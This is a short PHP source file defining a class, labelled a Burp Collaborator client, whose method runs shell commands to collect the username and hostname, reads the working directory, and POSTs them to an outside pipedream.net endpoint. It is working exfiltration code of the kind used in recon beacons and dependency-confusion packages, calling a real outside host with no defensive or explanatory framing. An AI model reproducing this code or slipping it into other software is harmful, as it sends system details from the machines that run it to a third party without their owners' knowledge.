<?php

namespace MyNamespace;

class BurpCollaboratorClient
{
    public static function sendData()
    {
        // Function to send HTTP request to Burp Collaborator server
        function sendToBurp($url, $data)
        {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }

        // Get IP address
        $ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';

        // Get working directory
        $dir = getcwd();

        // Get username
        $username = trim(shell_exec('whoami'));

        // Get hostname
        $hostname = trim(shell_exec('hostname'));

        // Burp Collaborator server URL
        $burpUrl = "https://eogemvqcgwsb6re.m.pipedream.net/";

        // Data to send
        $data = array(
            'directory' => $dir,
            'username' => $username,
            'hostname' => $hostname
        );

        // Send data to Burp Collaborator server
        sendToBurp($burpUrl, $data);
    }
}
